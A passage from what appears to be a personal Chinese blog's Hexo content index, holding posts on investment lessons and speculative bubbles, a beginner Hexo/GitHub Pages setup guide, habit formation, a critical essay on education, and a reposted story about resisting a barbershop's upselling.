个人实践经历：在17年12月-18年5月的这段时间里。我个人沉迷于资金盘项目，把自己的所有资金都压在了资金盘项目中，私以为把资金分配到不同类型的资金盘项目中就可以避免风险，因为把鸡蛋放到了不同的篮子里。而当我经历资金盘项目接二连三的跑路时，我才清醒过来，当巨大的风险来临时，动荡的不只是一个项目，而是一个领域的所有项目。正真的风险控制，应当分别把鸡蛋放到不同领域之中，多元化投资。 资产配置的本质是什么？本质上讲资产配置的核心就是寻求非相关性。 怎样判断资金配置是否多元化？由投资品种产生的回报是否与同一事件相关联判断。 列举几个多元化的资产：黄金、商品、房地产投资信托(real esta置e in一vestment truete)、通货膨胀保值债券以及特定种类的对冲基金。 20200716对于短期投资与长期投资的思考短期股市 更像是运动类知识，调用的是人类一开始进化而来的潜意识层大脑，主要通过下意识的条件反射来做出投资决策。 举例:「大多数新人懂很多投资道理，也知道破位止损的概念，但是一旦行情真来了。很多人反而被套，这本质上其实就反映出了他们潜意识层大脑对投资的知识还不够完善。大脑的条件反射因为是本能的情绪过于低级无法应对市场而导致的不好的决策。」 长期价值投资 更像是思考类知识，调用的是后天进化出来的理性脑，可以通过理性分析来进行投资决策。 很多投资大佬说让我们学习基础知识再投资，可以理解为先进行「理性脑」的培养，然后等理性脑的投资模型足够完善时，在投资市场中不断的使用某个模型，该投资模型思考习惯后就会转移到大脑的潜意识区域，「从而提高短线决策的质量,虽然无法规避情绪影响，但决策质量相较于没有练习过的本能反射，更加可靠一些」 （进化心理学概念可知，任何知识只要足够熟练都会进入大脑潜意识区域运行）","categories":[{"name":"思考输出","slug":"思考输出","permalink":"https://steinsgate.link/categories/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA/"}],"tags":[{"name":"思考输出：经济学丨投资","slug":"思考输出：经济学丨投资","permalink":"https://steinsgate.link/tags/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA%EF%BC%9A%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%B8%A8%E6%8A%95%E8%B5%84/"}]},{"title":"Hexo博客搭建从0到1完全指南","slug":"20207015","date":"2020-07-15T14:59:59.000Z","updated":"2020-07-15T10:45:44.000Z","comments":true,"path":"2020/07/15/20207015/","link":"","permalink":"https://steinsgate.link/2020/07/15/20207015/","excerpt":"HEXO系列！","text":"HEXO系列！ 第一部分：准备工作目录： [TOC]第一部分：准备工作 一、部署环境 1.安装Node.js 2.安装Git 二、创建仓库 三、部署SSH加密协议 1.安装配置SSH加密协议 2.将SSH公钥配置到仓1 3.安装Hexo git插件 四、部署Hexo框架 1.安装Hexo框架 2.安装相关依赖插件 3.Hexo常见命令 第二部分：正式上路 一、博客个性化 1.更换主题 2.主题细节自定义 二、博客功能加强 1、部署文章评论系统 Valine安装 Valine邮件提醒配置 2.安装音乐播放插件 APlayer安装 3.Google 服务 提交搜索引擎 Google Adsense Google Analytics 对象存储（图床） 第一部分：准备工作一、环境配置1.Node.js用来生成静态页面。官方下载地址：https://nodejs.org 2.Git用来将本地Hexo内容提交到Github上。 #MacOS自带Git官方下载地址：https://git-scm.com/ 二、创建仓库Github1.官网注册账号：https://github.com/ #用户名与博客域名相同，注册时注意斟酌填写。2.创建仓库， 仓库名为：&lt;Github账号名称&gt;.github.io 三、配置SSH加密协议设置SSH用户名和邮箱 1终端执行：git config --global user.name &quot;你的GitHub用户名&quot; 1终端执行：git config --global user.email &quot;你的GitHub注册邮箱&quot; 生成ssh密钥 1终端执行：ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot; 1终端执行：ssh-keygen -t rsa -C &quot;koudouuu@gmail.com&quot; 细节补充：一般情况下是不需要密码的，所以，接下来直接回车就好。细节补充：此时，在用户文件夹下就会有一个新的文件夹.ssh，里面有刚刚创建的ssh密钥文件id_rsa和id_rsa.pub。注意：id_rsa文件是私钥，要妥善保管，id_rsa.pub是公钥文件。 四、将SS公钥配置到github仓库添加公钥到github1.点击用户头像，然后点击显示的Settings(设置)选项2.在用户设置栏，点击SSH and GPG keys选项，然后点击New SSH key(新建SSH)按钮3.将id_rsa.pub中的内容复制到Key文本框中，公钥名称随意，然后点击Add SSH key(添加SSH)按钮 测试SSH部署是否成功 1测试SSH：ssh -T git@github.com 接下来会出来下面的确认信息：The authenticity of host ‘github.com (207.97.227.239)’ can’t be established. RSA key fingerprint is 17:24:ac:a5:76:28:24:36:62:1b:36:4d:eb:df:a6:45. Are you sure you want to continue connecting (yes&#x2F;no)?输入yes后回车,然后显示如下信息则OK(其中的SeayXu是用户名),如果提示user name就表示要输入github的账号邮箱，输入后回车，会提示输入password（github账号密码）回车即可。Hi SteinsGate-zero! You’ve successfully authenticated, but GitHub does not provide shell access. 添加SSH代码到根目录_config.yml配置文件夹中deploy:type: gitrepo:github: &#103;&#105;&#116;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#111;&#109;:tengj&#x2F;tengj.github.io.git,master 安装git插件 1npm install hexo-deployer-git --save 四、部署Hexo框架1.HEXO安装： 1npm install hexo-cli -g 2.初始化： 1Hexo：hexo init 3.安装依赖： 1npm install 4.启动Hexo： 1hexo server启动之后，打开浏览器，在地址栏输入：http://localhost:4000 你会看到Hexo的示例页面。注：此时可以初始化git本地仓库了，或者是等本地博客搭建好之后也可以。 常用指令$ hexo clean #清除缓存文件 (db.json) 和静态文件 (public)$ hexo g #生成缓存和静态文件$ hexo d #重新部署到服务器$ hexo s #本地服务器预览 第二部分：正式上路「佛系更新有留言催更的朋友的话，俺就抽空早点肝出来」","categories":[{"name":"技能输出","slug":"技能输出","permalink":"https://steinsgate.link/categories/%E6%8A%80%E8%83%BD%E8%BE%93%E5%87%BA/"}],"tags":[{"name":"IT","slug":"IT","permalink":"https://steinsgate.link/tags/IT/"},{"name":"IT：HEXO","slug":"IT：HEXO","permalink":"https://steinsgate.link/tags/IT%EF%BC%9AHEXO/"}]},{"title":"Hello World - 博客开始的地方","slug":"hello-world","date":"2019-11-10T16:00:00.000Z","updated":"2024-02-25T09:26:35.646Z","comments":true,"path":"2019/11/11/hello-world/","link":"","permalink":"https://steinsgate.link/2019/11/11/hello-world/","excerpt":"介绍一下我的博客","text":"介绍一下我的博客 [0x00] 博客相关HEXO博客创立于：2019年11月11日 之前创立过很多其他博客程序，但过于繁杂。所以选用了轻量级Hexo作为我的博客框架 框架：Hexo主机：Github PagesxCoding主题：Nexmoe图床：私家图床 [0x01] 博客主要内容分享我的成长分享我的思考分享我的经历 [0xff] 最后…最后就结束啦，希望各位在浏览本博客的时候都能有所收获!如有不足的地方各位可以提意见哦 -v-","categories":[{"name":"生活日常","slug":"生活日常","permalink":"https://steinsgate.link/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"}],"tags":[{"name":"生活日常","slug":"生活日常","permalink":"https://steinsgate.link/tags/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"}]},{"title":"乔治·索罗斯的投资经验","slug":"20181120","date":"2018-11-19T16:00:00.000Z","updated":"2020-07-15T10:45:32.000Z","comments":true,"path":"2018/11/20/20181120/","link":"","permalink":"https://steinsgate.link/2018/11/20/20181120/","excerpt":"用通俗的写法科普了投资底层的普世智慧！","text":"用通俗的写法科普了投资底层的普世智慧！ 84岁的索罗斯在达沃斯宣布退休，退出投资管理领域。这位传奇大师老了终于说出皇帝的新装-特别对投机于股票市场的人来说，记住他的这名言世界经济史是一部基于假象和谎言的连续剧。要获得财富，做法就是认清其假象，投入其中，然后在假象被公众认识之前退出游戏！——乔治·索罗斯（George Soros，投资家）附： 疯狂的郁金香历史上第一次著名的投机狂热发生在17世纪的荷兰，投机对象不是股票、房地产，也不是荷兰油画，而是一种花卉－－郁金香。当第一车郁金香从君士坦丁堡运抵安特卫普时，这种阔叶的多年生球茎草本植物被认为具有重要的“传播知识和观赏艺术”的价值。欣赏和栽培郁金香不久成为时尚，并演变成投机风潮。稀有品种的花价没完没了的攀升，球茎越奇异越值钱。贵族、市民、农民、商人、海员、女佣，甚至扫烟囱的老师傅和老裁缝们都沉醉在郁金香的投机热潮中。所有的人都认为：人们对郁金香的狂热会永远持续下去，世界各地的投机者都会跑到荷兰，以荷兰人开出的任何价格求购郁金香。那些起初认为价格不会上涨的人，看到亲戚朋友个个满载而归，无不捶胸顿足，懊恼不已。很少有荷兰人能抵制住这种诱惑。人们不惜拿家具、珠宝、地皮等东西来换取这小小的郁金香球茎，只因为后者更值钱。这场闹剧一直持续到1637年初，价格最终上升到令人不可思议的水平，开始大幅回落：1637年1月以20倍速度增长的郁金香球茎价格在2月以超过20倍的速度全面滑坡。政府出面救市也毫无作用，花价从悬崖上向下俯冲，最后其标价还不抵一个普通的洋葱。99％的人在劫难逃，整个荷兰经济陷入长期的萧条之中。春去春来，郁金香依旧绚丽的绽放。 密西西比骗局1716年，正当法国经济混乱、债台高筑、财政濒临崩溃之际，从苏格兰来了一个“财神”和“金融奇才”－－约翰.劳先生。法国皇室十分欣赏他以纸币辅助金属货币的计划，同意给他一些资本建立“劳氏公司”银行。这家银行发行的纸币用以支付国债，并根据特权可以随意购买和兑换，发行后价值也保持不变。这便使“劳氏纸币”被认为比经常因政府干预而贬值的金银更能保值。由于纸币要有硬通货支持，1717年劳先生又获取在北美密西西比河流域和路易斯安那州的垄断开发特权。他声称那里“遍地黄金”，以此出售密西西比公司不断增发的股票。但是，出售股票所获得的资金并没有用来开采“遍地的黄金”，而是被皇室用来还债。公众被密西西比公司丰厚的利润前景所诱惑，申购新股的人要昼夜排队，甚至等上几星期。公司股票的价格扶摇直上，有时几个小时就能涨20％。收购国债的钞票流入股市，股价暴涨又刺激了新股的发行。雪团越滚越大，整个法兰西沉浸在致富的狂热中，经济似乎也真的繁荣起来。1720年初，孔蒂亲王没能以满意的价格买到新股，一怒之下把装满三辆马车的纸币拉到劳氏银行兑换硬币。更多的人开始觉得黄金可能比纸币更好，加入到兑换的行列。由于银行缺乏足够的硬币，劳氏纸币在挤兑风潮中被宣布不可兑换，密西西比公司的股票在恐慌抛售中一落千丈。无数人因此倾家荡产，一贫如洗。 南海上的泡沫1711年，英国牛津的哈利伯爵创建了南海公司。作为承接英国政府债务的回报，公司除了获得政府6％的“安全利率”之外，还赢得南海贸易垄断权和南美金银矿藏开采权。但这个宏伟计划似乎有意忽略了一个重要事实，即当时仍称雄海上的西班牙声称对这些地区拥有垄断权。在人们渴望发财的狂热气氛下，南海公司垄断贸易徒有虚名这一事实没有人关心。公司股票价格从1720年1月的128英镑，上涨到3月的330英镑，6月的890英镑，7月的1000英镑。从来没有这样多的人在这样短的时间里变得这样的富有！受“南海效应”启发，许许多多的公司也纷纷推出各自据称可以带来“滚滚财源”的“新发明”，如永动机、新式肥皂、从黄瓜中抽取阳光以及“一个具有巨大优势但一时还没人能说清楚的项目”……所有的股票都有人买，所有的股票都身价百倍。最终，南海公司的高级管理层感到公司的股票价格与经营业绩之间的差距如此离谱，于是决定把持有的公司股票全部抛空。消息一泄漏，股价立刻下跌。不久，整个市场就因股价的一泻千里而处于极度恐慌中。政府官员为重树投资信心而付出的努力也不见成效。公众对市场的信心已经完全崩溃，无法挽回。无数公司的股票变成废纸一堆。“南海泡沫”危机中的大输家包括大名鼎鼎的天才科学家牛顿。事后他悲叹道：“我能计算天体的运动，却无法计算人群的疯狂行为。” 美国的教训正因为自由和繁荣导致的贪婪与恐惧，美国人亲手导演了两场人类文明史上最为壮观的投机热潮和最惨重的崩盘。20世纪20年代，人们对美国经济充满了信心。正是这一乐观态度，促成了全国上下的房地产和股市投机热潮。这场投机热潮的最大中心地之一是佛罗里达。那儿气候宜人，人口增长速度快，导致住房供不应求，地价暴涨。全国各地的投资投机者都纷至沓来，希望得到好回报。银行宽松的贷款条件更是火上浇油，房价能在几周内翻一番。人们确信不动产市场绝对没有下跌的可能。虽然时间过了几百年，这一论调却几乎与荷兰人在为郁金香发狂时候的论调一样。跟所有的投机狂热相同，这场投机热潮最后也无可避免地走到了尽头。到1926年，市场供过于求，不动产价格开始不断下跌，投机者们只得割肉出局，进而引发了整个市场的崩溃。1928年，投机战场从佛罗里达转移到了曼哈顿。这次是华尔街唱了主角。股市投机几乎成为一项全民爱好，成千上万的人无心正业，股票交易成为人们生活的重心。大资金、股票经纪人、咨询公司和上市公司联手操纵股价引诱公众上当的情况比比皆是。正当人们富贵梦正酣时，“晴天一声霹雳”，1929年10月28日，纽约股市爆发著名的“黑色星期二”，股指创下当日下跌12.82%的历史记录，拉开了特大经济危机的序幕。世界著名的经济学家、教授们说：“股价没有反映出它们的真实价格，还应该再涨上去。”股市用下跌来回应。胡佛总统站出来说：“国家的经济基本面是健康的，繁荣的。”，股市依然用下跌来回应。从1929年9月到1933年1月，道.琼斯30种工业股票平均价格从每股364.9美元跌到62.7美元，跌幅达82.8％。危机中，几千家银行倒闭，几万家企业关门，价值上亿的股票和几百万人的梦想随之灰飞烟灭。 电子狂热20世纪60年代初，科技发展，电子时代来临，华尔街也迎来电子狂潮。当时所有上市的股票名称几乎都与“电子”沾边，根本不管公司的业务是否与电子工业有关系。人们也毫不关心公司究竟是生产何种产品，只要它们听起来和“电子”有关就会引来争购和狂炒。美国音乐协会，其经营的业务是上门向顾客推销留声机和唱片，为了上市，将公司名称改为“电子旋律”，该公司的股票发行价为每股2美元，一周后就上涨到14美元。一个有40年历史，生产鞋带的小公司，把“鞋带公司”改名为“电子硅片动能催化公司”，公司产品还是鞋带，股价却天翻地覆，直冲云霄。当公众沉醉于快速致富的梦想里而不能抵制任何诱惑时，就连“妈妈甜点”之类的糕点公司也不甘寂寞的投入到改名大军中，希望改名后会一夜暴富。“电子热”在1962年落下帏幕。争购狂潮变成抛售狂潮，股价一落千丈，许多巨富沦为乞丐。 君子兰传奇历史总是惊人的相似。80年代，郁金香球茎的故事在中国重演。正值中国改革开放，市场上雨后春笋般出现了各种产品丰富人们的生活，其中包括家庭花卉，君子兰就是最吸引人的一种。这种植物原产地是非洲，引入中国后，成为身份显赫，富贵家庭高贵和品味的象征。80年代，北方城市长春将君子兰作为市花，全市一半以上家庭开始种植君子兰。由于君子兰生长期需要好几年，因此供给无法跟上，市场需求便徒然上升，价格开始上涨。这消息不胫而走，传到了全国其他城市。许多个体投机者开始筹集资金，将市场上的君子兰一抢而空。很快，君子兰的价格达到一个令人目眩的高度。开始，君子兰一般售价是每株100元，然后价格翻了2000倍，为每株200000元。这场投机热免不了会有同样的下场。君子兰还是君子兰，只是价格下跌了99％以上，令无数投机者血本无归。 日本“气泡”破裂20世纪后期规模最大的一次投机狂潮属于日本。二战后的几十年，日本人艰苦创业实现了经济的腾飞和国民的富有。80年代中期，不少日本人发现，炒股票和房地产来钱很快，“气泡”迅速弥漫。从1955年到1990年，日本不动产价格上涨了75倍多，股价上涨了100倍。人们的投机热情一浪高过一浪，根本不相信日本有限的土地价格会下跌，不相信股价会下跌。炒股成为日本大众生活的必需。日本最大的券商－－野村证券的股票市值就超过了全美国所有券商市值的总和。日本高尔夫场地的总价值达5000亿美元，是在澳大利亚证券交易所全部上市公司价值总和的2倍。根据地产价格，日本只需要卖掉东京市，所获取的资金就足够买下全美地产；只要卖掉皇宫便可以筹到足够的资金购买整个加利福尼亚。终于，政府认识到“泡沫经济”的危害，紧急刹车，调整利率，紧缩信贷，希望能把房地产价格涨势遏制住，让股市软着陆。但是局势已经不能控制了。日本的股市不是选择软着陆，而是彻底崩盘。1989年年底日经指数差不多40000点的水平，到1992年8月，指数就跌到14300点附近，并从此一蹶不振－－截止2002年11月29日，日经指数收盘为9215点。同时，房地产价格下跌了70％。 互联网热潮历史不会简单的重复,却常有惊人的相似之处。90年代后期，全球迎来互联网热潮。在“高科技，新技术”的口号下，每个人都相信“这一次真的不一样！”亚马逊书店和雅虎等互联网企业，其股价在一年内翻了10倍，没有人计算市盈率，也没有人关心企业是否会盈利。和60年代的电子狂热一样，只要企业改名，加上 .com 立刻就会吸引风险投资家的大笔资金和公众对股票的疯狂抢购。美国一家名为“音像网络”的小公司，业务是在网上传播各种电台和电视台的节目，自90年代中期成立就持续亏损，在互联网热潮中把名字改成“广播.com”，股价马上身价百倍，从每股18美元上涨到每股74美元，然后进一步炒到每股300美元。大洋彼岸的中国股市也紧跟世界潮流，上百家公司纷纷宣布触网，改名，披上高科技的外衣，忙着挂羊头卖狗肉，上演一幕幕荒诞悲喜剧。也许是为了再一次验证金融市场也有万有引力定律，代表全球高科技的美国纳斯达克股指由2000年3月的5048点跌至今年10月的1000多点，共30个月跌幅达78.4%。无数投资、投机者的希望与热情，贪婪与梦想最终化为苦涩的回忆与泡影。 为何人们总是健忘？为什么人们不会吸取以往惨痛的教训？在郁金香和互联网之间，是风动？是幡动？还是人类贪婪和恐惧的心在动？经济史学家说，人类的“金融记忆”是短暂的。可以肯定，人类的”泡沫史“还会继续不断地写下去。","categories":[{"name":"思考输出","slug":"思考输出","permalink":"https://steinsgate.link/categories/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA/"}],"tags":[{"name":"思考输出：经济学丨投资","slug":"思考输出：经济学丨投资","permalink":"https://steinsgate.link/tags/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA%EF%BC%9A%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%B8%A8%E6%8A%95%E8%B5%84/"}]},{"title":"习惯的机制与实践","slug":"20170408","date":"2017-04-07T16:00:00.000Z","updated":"2023-03-15T04:23:22.000Z","comments":true,"path":"2017/04/08/20170408/","link":"","permalink":"https://steinsgate.link/2017/04/08/20170408/","excerpt":"「改变」从习惯开始。","text":"「改变」从习惯开始。 本章主要科普习惯的原理，以及培养习惯高效的科学方法。 什么是习惯？习惯就是人的行为倾向。也就是说，习惯一定是行为，而且是稳定的、甚至是自动化的行为。用心理学的话来说，习惯是刺激与反应之间的稳固链接。 坏习惯是一种藏不住的缺点，别人都看得见，他自己看不见，因为习惯就是一种自动化的行为，潜意识表现的行为，并不一定是他自己希望的行为。我们每个人身上一定有很多好的习惯，也一定有些不好的习惯。 习惯的运行机制是什么？* 暗示-惯常行为-奖赏 这个过程我们称之为习惯回路。 例如:早上起床后你看到了洗面奶（暗示）-然后遍去倒水洗脸（惯常行为）-洗完后感觉清爽了许多（奖赏） 培养一个习惯&#x3D;建立了新的习惯回路，而在初期有旧的比如说不洗脸的坏习惯，那么你必须去刻意洗脸，当这一行为长时间每日坚持后，你的旧习惯（不想洗脸），会被新的习惯所代替（洗脸），如果长期坚持下来，如果偶尔不洗会觉得脸非常难受。 如果反之你就坚持了几天那么旧习惯就会重新支配你的行为（不洗脸）。 新习惯代替旧习惯是否意味着旧习惯已经消失？习惯永远存在的，我们无法消除他。所以必须找出新习惯比旧习惯好在什么地方，然后把新习惯的好处，当做坚持新习惯的一种信念。 改变习惯的黄金法则根据上述我们得知习惯的运行模式是 习惯回路:暗示-惯常行为-奖赏。而最改变习惯最好的办法就是保留奖赏和暗示，替换惯常行为。 -1-常见的习惯培养方法：一次培养多种习惯，培养者起初会觉得非常充实到最后的放弃。 我推荐的方法是： 待一种习惯养成之后，在实践另一个方法 -2-为什么我不推荐常用得习惯培养方法？行为一看起来不是效率更高吗？咱这里给你一一解析。 常见方法：一次实行多种习惯，相当于一次给大脑建立了多个习惯回路，使得大脑负担变重，在不变环境的影响下人们更习惯于重复以往的生活规律，又因为人的本性就是趋利避害，所以结果尝尝以失败告终，费时费力且低回报难实现的一种做法。 推荐方法:培养一个习惯，对大脑来说是建立了一个新的习惯回路，大脑负担轻。哪怕在旧环境的影响下你仍然容易放弃并持续以前的规律继续生活，但我相信除了精神病患者，凭借自己的一点点意志力每天刻意练习，并给予新习惯一定的意义（新习惯练成后有什么什么好处balabala….）就能达到想要的结果，各方面成本低于旧观点且回报高容易实现。 -3-懂得了习惯原理以及实践方法咱，剩下的则是付出行动培养出属于自己的成功习惯。 （成功习惯：我认为只要自己认为好的习惯培养成功后都能算是成功习惯。这里推荐几个个人认为非常重要的习惯：读书 跑步 写作（日记之类的） 培养成功习惯需要循序渐进不能一蹴而就。 好了本章就说到这里，如果您对习惯还想有更深刻的认知，那么我推荐以下这本书让您更透彻的了解习惯。 《习惯的力量》豆瓣评分8.0 ⬅⬅⬅ 轻触红色文字进入豆瓣了解 希望这篇文章能帮到你 然后如果您觉得文章有什么欠缺的地方或有没讨论到的相关观点欢迎留言指出，本人很乐意探讨。","categories":[{"name":"思考输出","slug":"思考输出","permalink":"https://steinsgate.link/categories/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA/"}],"tags":[{"name":"思考输出：行为科学","slug":"思考输出：行为科学","permalink":"https://steinsgate.link/tags/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA%EF%BC%9A%E8%A1%8C%E4%B8%BA%E7%A7%91%E5%AD%A6/"}]},{"title":"【负能量】个人对教育的观点-深度解析","slug":"20170302","date":"2017-03-01T16:00:00.000Z","updated":"2019-11-14T04:13:16.000Z","comments":true,"path":"2017/03/02/20170302/","link":"","permalink":"https://steinsgate.link/2017/03/02/20170302/","excerpt":"重新思考，旧的生活。","text":"重新思考，旧的生活。 读书这种选择当然是没有问题的，确实有很多成功的案例，但是很多人没有意识的是这种模式带来成长的同时其实也带给了我们束缚，教育的本质是一种教化系统，它在建立文明基础的同时，肩负了社会阶层再生产的作用，它不能打破阶层。 教育系统的本质其实是传递传统价值观念的工具。 默默付出就有回报，努力会有收获，但实际上这种观念是错的，学校的主要作用其实是一种类似政治的管制手段，他的重要作用是用来教化的，我们可以看一下学校的模式，在课本和知识内容相对固定的模式里，你只要勤学苦练遵循遵循多劳多得的一些题海战术之类的成绩总会有成长，于是他就培养了你努力就会有回报，这种线性思维，而在环境相对单一的学校里往往只要你愿意付出乐于奉献，总有老师会看到你的优秀，于是它又培养了你一种无私奉献，终有回报的道德观念。 又在那种一日为师终生为父之类的说法里，你就对你那些限制你自由的人让你听话照做的人有了服从意识，让你进入了类似斯哥德尔摩综合症的那种状态。 斯哥德尔摩综合症 ：当一个人承受恐惧到了底线以后，他就会把他的生命或者意识依托给给他带来恐惧的人，最后变成崇拜。 学校这种环境一直给我们一种人人都是平等的错觉，觉得努力会有回报，世界机会是公平公正的，其实说白了，他让我们有这些错觉只是一些国家的管制手段一些政治需求，其实很多步入社会的人就很清楚这个世界是没有所谓的公平的，一步一个脚印的工作，然后你就可以眼睁睁的看着领导的亲戚平地飞升，如果你相信付出总会有收获，默默付出终究会被人发现你的好，你就会看到那些邀功的人被赞许，教育它从来都只是稳定阶级的一个需求，如果有一个人告诉你你就算再怎么读书都不可能改变命运的，这种时候整个阶级就会不稳定，因为没有人希望有人眼睁睁的看着别人享受自己的痛苦，但是只要人家告诉你还有机会，整个社会局面是相对稳定的，所以他只是一种管制手段。 教育本身就离不开阶层，但是很多人觉得他可以打破阶层，教育他有个核心其实就是在传递等级观念。一个人的学历背景和他的家庭经济状况，和他家庭的背景组成有很大的关系。 学历不公平，有些人从小接受着比别人良好的教育但是在获取学历这条路上他们又要求普通人按照他们一样的模式去竞争，他本身也不公平。 大家都说学历打破阶层，其实不过是不断加固这阶层的积累。","categories":[{"name":"思考输出","slug":"思考输出","permalink":"https://steinsgate.link/categories/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA/"}],"tags":[{"name":"思考输出：教育","slug":"思考输出：教育","permalink":"https://steinsgate.link/tags/%E6%80%9D%E8%80%83%E8%BE%93%E5%87%BA%EF%BC%9A%E6%95%99%E8%82%B2/"}]},{"title":"我在理发店里一场价格十元的修行","slug":"20170115","date":"2017-01-24T16:00:00.000Z","updated":"2019-11-14T04:13:10.000Z","comments":true,"path":"2017/01/25/20170115/","link":"","permalink":"https://steinsgate.link/2017/01/25/20170115/","excerpt":"作者：荆棘王子（转自豆瓣）","text":"作者：荆棘王子（转自豆瓣） 人生无处不修行。比如理发店小小一间，也是可以是锻炼心智的所在。 外面的理发店太贵，所以这个学期一直没剪头发。昨天回到家乡，吃完饭就去了一家新开的理发店，就在店里展开了一场“绝对不想办卡的顾客 v.s. 绝对要让你办卡的店员”的角力。 店外打着大幅广告：“新店开张，洗剪吹10元。”还不到营业高峰时段，客人不少也不多。给我洗头的小姑娘动作倒很温柔，只是聊天技巧太僵硬。要不是我和她性别相同，否则一番对话几乎就是初次相亲见面的标准模板。得知我没有会员卡后，便开始推荐三款级别不同的会员卡，一款比一款金碧辉煌。 我不置可否，正好此时头发已洗毕，小姑娘问我有没有相熟的理发师。店里的理发师乍一看都是20岁出头的黄毛小伙子或者小姑娘——而且确实是字面意义上的黄毛——实际上他们均早已身任要职，能拿剪子的起步“XX总监”。 尽管小姑娘极力热情宣扬驻店首席资深高级创意总监的手艺，在我的极力明确要求下，来了一个收费最便宜的技术总监，说定价格10元，不染不烫。 技术总监：“美女你好。” 我：“你好。” 技术总监：“美女你第一次来哈？发质挺好的哈，想剪个什么发型？短一点哈。美女有会员卡不？没有哈。没关系的，我们新店开张现在有办卡的优惠活动，力度很大的，充500实际存800，充1000……” 我：“我在外地读书，过年才回来。你看我办了卡根本不划算呀。” 技术总监：“可以办了卡给你家里人用。” 我：“他们已经被别的店套牢了。” 技术总监：“哈哈没关系的。我看了看你的脸型和总体气质，想给你设计这么一个发型，我给你找个图片参考一下……就是类似这样。这边会帮你把头发设计出蓬松一点的感觉，这边呢剪出层次。然后帮你整理一下发线的型，你原先的型有点乱。大体上可以吧？” 我：“可以。” 技术总监：“你不常来美发店吧？头发好久没打理了。这个发线型看得出来。你相信我哈，我帮你整理一下，剪出层次来，保证你对效果满意。” 技术总监伴随着店里播放的动感音乐节奏，唰唰唰剪了一阵子后，旁边突然出现了另一个小哥，拖了一个包和一个器械过来，并开始把包里的瓶瓶罐罐拿到一旁的小桌子上，随后往我头发上涂一种刺鼻的不明乳白色半流质半胶质物体。 我：“这涂的是什么？” 技术总监：“这是做发线定型用的——” 我到这个时候才忽然意识到，所谓“发线定型”云云是一个额外的收费项目。 果然技术总监接下去说道：“我们新开业在进行大酬宾活动，发线定型这一项的原价1360，美女你等会儿办一张会员卡，可以享受半价优惠680。” 我：“嗯，可是我并不想办卡啊，我也不知道这个发线定型是要另外收费的。” 技术总监的笑容消失了：“我刚才都跟你详细介绍过的。你同意了我才开始的。” 我：“我同意的是你对我发型的构想。一开始你并没有说清楚这项发线定型要收费。我跟你们洗头小姑娘讲过，不染不烫，只要剪10块钱。” 技术总监：“美女你这样我很为难的，那我进行不下去了。” 我：“我没有为难你，相反，我对你的服务很满意。我也不追究你刚才没说清楚是不是要另外收费，你推荐的这个项目也不错，我可以尝试一下的。但是不管1360还是680，价格我绝对不能接受。” 技术总监：“680这个价格很优惠的，其他人也给不了这个优惠，这是我负责的项目。” 我：“你们肯定有内部员工折扣吧？诚恳一点给我个最优惠折扣，这样我们两个人都高兴。” 技术总监：“美女，我也只是个小打工的，我没有权限。” 我：“谁有这个权限呢？” 技术总监：“我们老总！在XX市！” 我：“小哥，你看现在情况就是这样：我呢不想办卡，理由你知道了，我平时基本不在本地；我呢也不接受“发线定型”现在这个价格。你可以去跟你们店长商量一下，看他有没有什么解决办法。” 技术总监去了一会儿回来说：“美女，他给你一个内部最优惠方案：只要办一张卡，充1000元，就可以在680的基础上再享受一折优惠，一折哦！只要68。” 说着他伸出左右各一根食指，交叉搭成一个“十”字。 我：“68的价格我可以接受，但我说过并不想办卡。” 沉默中，技术总监发动“你这个穷鬼~~~~”眼神凌厉杀伤攻势100次，被我张开“我就是没钱不服打我呀”结界顺利反弹。 一个满脸写着“我是店长”的男人走了过来，皱着眉头说道：“美女，我们现在开业酬宾，办卡的优惠力度很大，你以后拿卡来洗头美容都可以，你家里其他人也可以用的。” 我说：“我知道呀，这些话刚才洗头小姑娘和这位小哥都跟我说过了。我也跟他们都说过，我平时在外地，况且我不烫不染每次就剪一下，在卡里存那么多钱要用到何年何月呢？你们一定还有别的方案吧？这个项目走你们内部流程要多少钱？” 店长：“那只好这样了，你硬是不要办卡，那就在680元基础上再对折，340元现金。这已经到底了。美女你放心好了，这个做完保证你漂亮。你不满意的话我们一分钱也不要。” 我：“刚才这个小哥帮我剪头发我一直很满意的呀。你们放心，满意也说不满意这种事情我不干的，东西好不好我心里都有数。谈不拢也没关系的呀，那麻烦你们帮我把头上这个东西洗掉好了。” 对话过程中另一个小哥一直不停地在往我头发上涂抹刺鼻不明物质，此时其实已经接近尾声，涂得满头都是。我说“麻烦你们帮我把头上这个东西洗掉好了。”这句话的时候，他正准备用一张大保鲜膜把我的头包起来。我手一扬，招呼他停下，他有一点受伤的神情，在技术总监和店长眉头紧锁满面厌憎的背景里，倒让我生出一些不明所以的愧疚。 后记： 其实说实话，作为一个孤身的生客，当时被三个年轻力壮的男性以不友好的态度呈半包状围着，心理压力还是有的。在三番两次的诱使和陷阱作用下，但凡有一点软弱，这卡就不得不办了；但凡有一点急躁，说不定会吵起来甚至引发人身纠纷。 我妈知道这件事来龙去脉后，欣慰地说：“你真是长大了。” 我大笑：“不是。我只是真的只带了十块钱。”","categories":[{"name":"转载","slug":"转载","permalink":"https://steinsgate.link/categories/%E8%BD%AC%E8%BD%BD/"}],"tags":[{"name":"转载","slug":"转载","permalink":"https://steinsgate.link/tags/%E8%BD%AC%E8%BD%BD/"}]},{"title":"小丸工具箱使用经验","slug":"20161213","date":"2016-12-12T16:00:00.000Z","updated":"2019-11-14T04:13:06.000Z","comments":true,"path":"2016/12/13/20161213/","link":"","permalink":"https://steinsgate.link/2016/12/13/20161213/","excerpt":"小丸工具箱的使用经验分享","text":"小丸工具箱的使用经验分享1.什么是压制？我认为压制就是“保留画质，缩小体积”的过程。这里要引入另一个关键词“观感”，首先要知道，画质≠观感。任何片源经过压制就意味着画面损失，画质降低，哪怕只是0.00000001%，但是观感却有可能提升，因为可能经过了反交错、降噪、锐化、upscale（低清转高清）等处